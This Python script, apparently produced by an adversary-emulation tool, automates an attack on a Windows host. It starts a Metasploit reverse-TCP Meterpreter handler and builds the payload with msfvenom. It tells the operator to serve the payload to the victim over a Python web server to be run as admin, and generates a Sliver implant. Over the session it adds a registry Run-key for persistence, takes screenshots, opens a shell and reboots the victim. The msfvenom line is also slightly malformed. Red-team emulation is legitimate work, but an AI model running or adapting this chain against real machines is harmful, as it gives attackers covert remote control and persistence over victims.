
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-demos/docs/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor
    metasploit_executor = MetasploitExecutor(config=config)

    metasploit_executor.exploit_and_execute_payload(
        exploit_module_name="multi/handler",
        payload_module_name="windows/meterpreter/reverse_tcp",
        LHOST="192.168.56.102",
        LPORT="8888",
    )

    pddl_parameters = {}

    console.print(f"[bold cyan]\n📌Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan]\n📌Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input

    confirm_action()

    console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")
    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input

    # MSFVenom command execution
    console.print(f"[bold cyan]\n[MSFVenom Console] Generating payload...[/]")
    msfvenom_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={user_params["LHOST"]} LPORT={user_params["LPORT"]} -f exe \ -o ~/payload.exe"

    import subprocess
    try:
        result = subprocess.run(
            msfvenom_command,
            shell=True,
            capture_output=True,
            check=True
        )
        console.print(f"[bold green]✓ Payload generated successfully[/]")
        # Only print stderr if it exists (msfvenom writes info to stderr)
        if result.stderr:
            stderr_output = result.stderr.decode('utf-8', errors='ignore')
            console.print(stderr_output)
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]✗ MSFVenom command failed: {str(e)}[/]")
        if e.stderr:
            stderr_output = e.stderr.decode('utf-8', errors='ignore')
            console.print(f"[red]{stderr_output}[/]")
        raise

    print_finished_message("MSFVenom payload generated successfully!😊")

    console.print(f"[bold cyan]\n📌Step 2 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: HOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for HOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: HOST")
    user_params["HOST"] = user_input

    console.print(f"[bold cyan]\n📌Step 2 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan]\n📌Step 2 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()


    console.print(f"[bold cyan]\n📌Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    default_val = ''
    user_input = console.input(
        f"[bold]➤ Enter value for meterpreter_sessionid [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: meterpreter_sessionid")
    user_params["meterpreter_sessionid"] = user_input

    # Meterpreter Session Selection
    console.print("[bold cyan]\n[Meterpreter Executor] Session Selection[/]")
    metasploit_sessionid = metasploit_executor.select_meterpreter_session()

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: netstat[/]")
    confirm_action()
    try:
        metasploit_executor.netstat(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan]\n📌Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input

    console.print(f"[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print("""
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
    """)
    confirm_action()

    console.print(f"[bold cyan]\n📌Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    console.print(f"[bold cyan]\n📌Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")

    default_val = None
    user_input = console.input(
        f"[bold]➤ Enter value for SAVE_PATH [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SAVE_PATH")
    user_params["SAVE_PATH"] = user_input
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()

    console.print(f"[bold cyan]\n📌Step 7 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    default_val = ''
    user_input = console.input(
        f"[bold]➤ Enter value for meterpreter_sessionid [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: meterpreter_sessionid")
    user_params["meterpreter_sessionid"] = user_input

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: shell[/]")
    confirm_action()
    try:
        metasploit_executor.shell(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: command_to_execute[/]")
    console.print(f"  Description: Thing to Run")

    default_val = 'C:\\Path\\AtomicRedTeam.exe'
    user_input = console.input(
        f"[bold]➤ Enter value for command_to_execute [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: command_to_execute")
    user_params["command_to_execute"] = user_input

    confirm_action()
    commands = """
    REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"#{command_to_execute}\"

    """
    metasploit_executor.communicate_with_msf_session(input_texts=commands, session_id=metasploit_sessionid)

    print_finished_message()


    console.print(f"[bold cyan]\n📌Step 10 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    default_val = ''
    user_input = console.input(
        f"[bold]➤ Enter value for meterpreter_sessionid [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: meterpreter_sessionid")
    user_params["meterpreter_sessionid"] = user_input

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: screenshot[/]")
    confirm_action()
    try:
        metasploit_executor.screenshot(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌Step 11 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: meterpreter_sessionid[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection")

    default_val = ''
    user_input = console.input(
        f"[bold]➤ Enter value for meterpreter_sessionid [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: meterpreter_sessionid")
    user_params["meterpreter_sessionid"] = user_input

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: reboot[/]")
    confirm_action()
    try:
        metasploit_executor.reboot(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

if __name__ == "__main__":
    asyncio.run(main())
